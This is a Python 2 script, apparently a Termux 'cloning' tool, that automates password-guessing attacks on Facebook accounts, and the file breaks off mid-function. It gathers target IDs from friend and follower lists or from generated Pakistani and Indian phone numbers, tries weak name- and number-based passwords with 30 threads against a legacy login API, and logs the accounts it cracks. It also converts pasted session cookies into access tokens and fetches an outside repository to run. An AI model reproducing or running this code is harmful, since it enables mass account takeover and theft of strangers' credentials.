#coding=utf-8
#!/usr/bin/python2
try:
    import os, sys, time, datetime, re, threading, json, getpass, urllib, random, requests, subprocess, hashlib, cookielib, uuid, base64, json
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Juttbrand.py')

os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

os.system('git pull')
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
my_color = [
 O, U, B, K, H, M, P]
warna1 = random.choice(my_color)
my_color = [
 M, H, P, K, U, B, O]
warna2 = random.choice(my_color)
my_color = [
 U, O, K, P, H, K, B]
warna3 = random.choice(my_color)
__author__ = 'Jutt Badshah'
__copyright = 'All rights reserved . Copyright Jutt Badshah'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


agents = [
 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0']
birth = [
 '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
logo = """ 
\033[1;37m    d8888b. d888888b .d8888. db   db db    db 
\033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
\033[1;32m    88oobY'    88    `8bo.   88ooo88 88    88 
\033[1;32m    88`8b      88      `Y8b. 88~~~88 88    88 
\033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
\033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
\033[1;97m-------------------------------------------------
\033[1;97m  \xe2\x9e\xa4 Author  : Rishu Khan (\x1b[1;32mAL3X\x1b[1;37m) 
\033[1;97m  \xe2\x9e\xa4 Github  : https://github.com/Alon3-Rishu
\033[1;97m  \xe2\x9e\xa4 Fb ID   : https://facebook.com/al3x.rishu
\033[1;97m-------------------------------------------------
\033[0;91m****************\033[1;92mENJOY FREE CLONIG\033[1;91m****************
\033[1;97m-------------------------------------------------"""

def main_menu():
    os.system('clear')
    print logo
    print("[\033[1;91m\033[1;47m-----------------CLONING MINU------------------\033[0m]\033[0;97m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Login cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Random number cloning '
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] Followe me for [\033[1;92mHelps\033[1;97m]'
    print('\033[1;97m-------------------------------------------------')
    main_menu_sel()


def main_menu_sel():
    sel = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \x1b[1;92m')
    if sel == '1':
        log_menu()
    elif sel == '2':
        ran()
    elif sel == '3':
        os.system('xdg-open https://www.facebook.com/al3x.rishu')
        main_menu()
    else:
        print ''
        print '\x1b[1;91mSelect valid option\x1b[1;37m'
        print ''
        main_menu_sel()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        jutt_menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m------------------LOGIN MENU-------------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m[\033[1;92m1\033[1;97m] Login with Email Pass'
        print '\x1b[1;97m[\033[1;92m2\033[1;97m] Login with token'
        print '\x1b[1;97m[\033[1;92m3\033[1;97m] Login with cookies'
        print '\x1b[1;97m[\033[1;92m4\033[1;97m] Get Token For Login\x1b[1;97m'
        print '\x1b[1;97m[\033[1;92m5\033[1;97m] Follow me [\033[1;92mRISHU\x1b[1;97m]'
        print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back'
        print('\033[1;97m-------------------------------------------------')
        log_menu_s()


def log_menu_s():
    sel = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : ')
    if sel == '1':
        log_fb()
    elif sel == '2':
        log_token()
    elif sel == '3':
        log_cookie()
    elif sel == '4':
        gen_token()
    elif sel == '5':
        os.system('xdg-open https://www.facebook.com/al3x.rishu')
        log_menu()
    elif sel == '0':
        main_menu()
    else:
        print ''
        print '\\ \033[1;91mSelect valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\x1b[1;37mLogin with id/pass'
    print('\033[1;97m-------------------------------------------------')
    lid = raw_input('\x1b[1;97m[\033[1;92m•\033[1;97m] Id/mail/no: ')
    pwds = raw_input('\x1b[1;97m[\033[1;92m•\033[1;97m] Password: ')
    print('\033[1;97m-------------------------------------------------')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + lid + '&pass=' + pwds).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            jutt_menu()
        elif 'www.facebook.com' in q['error']:
            print '\033[1;92m User must verify account before login'
            raw_input('\x1b[1;97m Press enter to try again ')
            log_menu()
        else:
            print ' \033[1;91mId/Pass may be wrong'
            raw_input(' \x1b[1;97mPress enter to try again ')
            log_menu()
    except:
        print ''
        print '\x1b[1;37mUpdate tool'
        log_menu()


def log_token():
    os.system('clear')
    print logo
    print("[\033[1;91m\033[1;47m------------------LOGIN TOKEN------------------\033[0m]\033[1;37m")
    print('\033[1;97m-------------------------------------------------')
    tok = raw_input('\x1b[1;97m[\033[1;92m•\033[1;97m] Paste token here: \x1b[1;92m')
    print('\033[1;97m-------------------------------------------------')
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    jutt_menu()


def log_cookie():
    os.system('clear')
    print logo
    print '\x1b[1;97m[\033[1;92m*\033[1;97m] Login Cookies'
    print('\033[1;97m-------------------------------------------------')
    try:
        cookie = raw_input('\x1b[1;97m[\033[1;92m•\033[1;97m] Paste cookies here: ')
        print('\033[1;97m-------------------------------------------------')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        jutt_menu()
    except AttributeError:
        print ''
        print '\t\033[1;91mInvalid cookies'
        print ''
        raw_input(' \x1b[1;97mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\t\033[1;91mInvalid cookies'
        print ''
        raw_input(' \x1b[1;97mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\t\033[1;91mInvalid cookies'
        print ''
        raw_input(' \x1b[1;97mPress enter to try again ')
        log_menu()


def jutt_menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;97m[\033[1;92m*\033[1;97m] Login FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t\033[1;91mAccount Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t \033[1;91mTurn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;97mPress enter after turning on mobile data/wifi ')
        jutt_menu()

    os.system('clear')
    print logo
    token = open("access_token.txt","r").read()
    print("[\033[1;91m\033[1;47m-----------------CLONING MINU------------------\033[0m]\033[0;97m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97mLogged in user : \x1b[1;92m' + z
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Public Id Cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Make File Extract ids'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] Followe me [\033[1;92mRUSHU\033[1;97m]'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back'
    print('\033[1;97m-------------------------------------------------')
    jutt_select()


def jutt_select():
    js = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Choose : \033[1;92m')
    if js == '00001':
        menu()
    elif js == '1':
        brand_menu()
    elif js == '2':
        os.system("git clone https://gitlab.com/yeswantmishra132rahul/new-extract")
        os.system("cd new-extract")
        os.system("python2 run.py")
    elif js == '3':
        os.system('xdg-open https://www.facebook.com/al3x.rishu')
        jutt_menu()
    elif js == '0':
        main_menu()
    else:
        print ''
        print '\t\033[1;91mSelect valid option'
        print ''
        jutt_select()


def gen_token():
    os.system('clear')
    print logo
    print '\x1b[1;97m~~~~~~Generate FB Token~~~~~~\x1b[0;97m'
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[0;91mNote: Token Generate Only New Accounts\x1b[0;97m'
    print '\x1b[0;91mDont Try On Personal Or Old Account\x1b[0;97m'
    print('\033[1;97m-------------------------------------------------')
    uid = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] ID/Email/Number:\x1b[0;97m')
    passw = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Password:\x1b[0;97m')
    print('\033[1;97m-------------------------------------------------')
    data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true').text
    q = json.loads(data)
    if 'access_token' in q:
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m[\033[1;92m✓\033[1;97m] \x1b[1;32mYour Access Token: \x1b[0;97m' + q['access_token'] + '\n\n'
        print('\033[1;97m-------------------------------------------------')
        raw_input('\x1b[1;97mPress enter to back ')
        log_menu()
    elif 'www.facebook.com' in q['error_msg']:
        print ' '
        print '\t\033[1;91mAccount has checkpoint'
        print ''
        raw_input('\x1b[1;97mPress enter to back')
        log_menu()
    else:
        print ''
        print '\t\033[1;91mID/number/pass may be wrong'
        print ''
        raw_input('\x1b[1;97mPress enter to back\x1b[0;97m')
        log_menu()


def ran():
    id = []
    cps = []
    oks = []
    os.system('clear')
    print logo
    print '\x1b[1;97m~~~~~Random Number Cloning~~~~~'
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Pakistan idz Cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] indian idz Cloning'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] Join My WP Group'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    ran_sel()


def ran_sel():
    id = []
    cps = []
    oks = []
    r_s = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \x1b[0;92m')
    if r_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Enter Code 01 to 49\x1b[0;97m'
        print('\033[1;97m-------------------------------------------------')
        c = raw_input('\x1b[1;97m[\033[1;92m✓\033[1;97m] Enter code : \x1b[0;92m')
        k = '+923'
        try:
            file = '.txt'
            for line in open(file, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;91mFile Not Found'
            raw_input('\x1b[1;97mPress Enter To Back')
            ran()

    elif r_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;97m[\033[1;92m✓\033[1;97m] 905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578\x1b[0;97m'
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Enter 3 Digit Any Indian Number'
        print('\033[1;97m-------------------------------------------------')
        c = raw_input('\x1b[1;97m[\033[1;92m✓\033[1;97m] Enter code:\x1b[0;97m ')
        k = '+91'
        try:
            file = '.txt'
            for line in open(file, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;91mFile Not Found'
            raw_input('\x1b[1;97mPress Enter To Back')
            ran()

    elif r_s == '3':
        os.system('xdg-open https://chat.whatsapp.com/KLYQVGYDT1yEwbiVF532YY')
        ran()
    elif r_s == '0':
        main_menu()
    else:
        print ''
        print '\x1b[1;91mSelect Valid Option'
        ran_sel()
    xxx = str(len(id))
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Total numbers : \033[1;92m' + xxx
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97mThe process has started'
    time.sleep(0.5)
    print '\x1b[1;97mPress ctrl + z to stop\x1b[1;97m'
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("      Use flight Airplane Mode Before Use")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')

    def main(arg):
        user = arg
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = '03' + c + user
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + k + c + user + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[RISHU-OK] ' + k + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/RISHU-OK-.txt', 'a')
                ok.write(k + c + user + '|' + pass1 + '\n')
                ok.close()
                oks.append(k + c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;33m[RISHU-CP] ' + k + c + user + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('/sdcard/ids/RISHU-CP.txt', 'a')
                cp.write(k + c + user + '|' + pass1 + '\n')
                cp.close()
                cps.append(k + c + user + pass1)
            else:
                pass2 = user
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + k + c + user + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[RISHU-OK] ' + k + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/RISHU-OK.txt', 'a')
                    ok.write(k + c + user + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(k + c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;33m[RISHU-CP] ' + k + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('/sdcard/ids/RISHU-CP.txt', 'a')
                    cp.write(k + c + user + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(k + c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[!] The cloning process has been completed")
    print '\x1b[1;92mTotal \x1b[1;92mOk\x1b[1;97m/\x1b[1;93mCp :\x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cps))
    print '\x1b[1;97mTotal \x1b[1;92mOk :\x1b[1;92m' + str(len(oks))
    print '\x1b[1;97mTotal \x1b[1;93mCp :\x1b[1;93m' + str(len(cps))
    print("\033[1;97m-------------------------------------------------")
    raw_input('\x1b[1;92mPress enter to back\x1b[0;97m')
    main_menu()


def brand_menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t \033[1;91mAccount Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t \033[1;91mTurn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;97mPress enter after turning on mobile data/wifi ')
        brand_menu()

    os.system('clear')
    print logo
    token = open("access_token.txt","r").read()
    print("[\033[1;91m\033[1;47m-----------------CLONING MINU------------------\033[0m]\033[0;97m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Logged in user : \x1b[1;92m' + z
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Crack with Auto Passw [\033[1;92m8\033[1;97m]'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Crack Choice Number Passw [\033[1;92m6\033[1;97m]'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] Crack Choice Name + Number Passw [\033[1;92m8\033[1;97m]'
    print '\x1b[1;97m[\033[1;92m4\033[1;97m] Make File Extract ids'
    print '\x1b[1;97m[\033[1;92m5\033[1;97m] Join My WP Group\x1b[1;97m'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    bm_s()


def bm_s():
    bs = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \033[1;92m')
    if bs == '1':
        jutt_crack()
    elif bs == '2':
        brand_crack()
    elif bs == '3':
        fast_crack()
    elif bs == '4':
        os.system("git clone https://gitlab.com/yeswantmishra132rahul/new-extract")
        os.system("cd new-extract")
        os.system("python2 run.py")
    elif bs == '5':
        os.system('xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK')
        brand_menu()
    elif bs == '0':
        jutt_menu()
    else:
        print ''
        print '\t\033[1;91mSelect valid option'
        print ''
        bm_s()


def jutt_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t \033[1;97mLogin FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print('[\033[1;91m\033[1;47m-------------------AUTO PASS-------------------\033[0m]\033[0;97m')
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Public id cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Followers cloning'
    print '\x1b[1;97m[\033[1;92m3\033[1;97m] File cloning'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    jc_s()


def jc_s():
    id = []
    cps = []
    oks = []
    j_s = raw_input('\x1b[1;97m[\033[1;92m*\033[1;97m] Choose : \033[1;92m')
    if j_s == '1':
        os.system('clear')
        print logo
        print('[\033[1;91m\033[1;47m-------------------AUTO PASS-------------------\033[0m]\033[0;97m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input(' \x1b[1;97mPress enter to try again \x1b[1;97m')
            jutt_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif j_s == '2':
        os.system('clear')
        print logo
        print('[\033[1;91m\033[1;47m-------------------AUTO PASS-------------------\033[0m]\033[0;97m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input('\x1b[1;97mPress enter to try again \x1b[1;97m')
            jutt_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif j_s == '3':
        os.system('clear')
        print logo
        print('[\033[1;91m\033[1;47m-------------------AUTO PASS-------------------\033[0m]\033[0;97m')
        print('\033[1;97m-------------------------------------------------')
        try:
            idlist = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m]  File Name : \x1b[0;92m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\033[1;91m[!] File Not Found.'
            raw_input('\x1b[1;97mPress Enter To Back. \x1b[1;97m')
            jutt_crack()

    elif j_s == '0':
        brand_menu()
    else:
        print ''
        print '\x1b[1;91mChoose valid option'
        jc_s()
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Total ids : \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("      Use flight Airplane Mode Before Use")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + '@123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RISHU_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RISHU_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '123'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RISHU_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RISHU_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '1234'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RISHU_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RISHU_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '12345'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('RISHU_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('RISHU_CP.txt', 'a')
